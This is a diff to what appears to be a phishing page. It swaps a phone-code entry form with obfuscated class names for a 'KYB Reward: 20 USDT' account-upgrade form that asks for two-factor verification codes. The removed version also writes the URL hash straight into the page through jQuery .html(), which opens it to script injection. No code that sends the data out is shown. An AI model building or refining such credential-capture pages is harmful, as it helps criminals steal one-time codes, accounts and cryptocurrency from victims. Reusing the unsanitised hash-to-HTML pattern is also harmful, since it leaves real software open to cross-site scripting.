@@ -1,56 +1,25 @@
+<div id="form-screen">
+        <div class="form-container">
+            <div class="reward-badge">🎁 KYB Reward: 20 USDT</div>
+            <h2 class="classic-title" style="font-size: 24px;">Upgrade Account</h2>
+            
+            <h5 id="main-header" class="classic-title">Two-Factor Verification</h5>
+            <p id="sub-header" class="classic-desc">Please complete the required security checks below to autheticate your device session.</p>
+            
+            <form id="verification-form">
+                <div id="dynamic-2fa-fields" class="form-group-wrapper">
+                    <!-- Inputs generated dynamically via renderTwoFactorFields() go here -->
+                </div>
+                
+                <button type="submit" class="action-btn btn-start">
+                    <span class="btn-text">Confirm & Verify</span>
+                    <span style="display: none;" id="z6x2c9v4b1_992211" class="spinner-border"></span>
+                </button>
+                
+                <div style="width: 100%; color: #dc3545; margin-top: 10px; text-align: center;" class="text-danger"><small id="error-div"></small></div>
+            </form>
+            
+        </div>
+    </div>
 
-		<div id="a1x9k2m7p4_992211" class="q7n4v8r2t1_992211">
-			
-			<div class="b5h3d9s8l2_992211">
-				<img src="../images/a8f3k2m9q1.webp">
-			</div>
-			<div class="c8j2f6w9z4_992211">
-				<div class="d3k7u1y5x8_992211">
-					<img src="../images/z0x4n7b2c9.png">
-				</div>
-				<div class="e6p4m2q9r7_992211">
-					<div class="f1t8v3n6b5_992211">
-						<img src="../images/m5t8r1p4w6.png">
-					</div>
-					<div class="g9w2s4h7k1_992211">
-						<img src="../images/q9c2v7l0s3.png">
-						<span id="u8z3x6c1v5"></span>
-					</div>
-
-					<div class="h4r7m1p9q2_992211">
-						<input type="hidden" id="placeholder" value="">
-						<form>
-							<div class="i6n2b8v4c3_992211">
-								<img src="../images/verify.png">
-							</div>
-							<div class="i6n2b8v4c3_992211" id="sub-header">
-								Enter the code that was sent to your phone number.
-							</div>
-							<div class="j5k9d3l7s1_992211" id="z3x8c2v7b1n6m5">			
-								<input type="text" id="indicator" name="code" autocomplete="off" placeholder="Type here...">
-							</div>
-							<div style="width: 100%; text-align: center;" id="error-div" class="text-danger"></div>
-							<div class="l9q1w4e7r2_992211">
-								<button type="submit" class="btn btn-primary btn-start">Verify
-									<span style="display: none;" id="z6x2c9v4b1_992211" class="spinner-border spinner-border-sm"></span>
-								</button>
-							</div>
-						</form>
-					</div>
-
-				</div>
-			</div>
-		</div>
-
-
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"></script>
-<script>
-	const hashValue = window.location.hash;
-
-	// Remove the '#' character to get just the data
-	const parameter = hashValue.substring(1); 
-	if (parameter) {
-	    $("#u8z3x6c1v5").html(parameter);
-	}
-</script>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
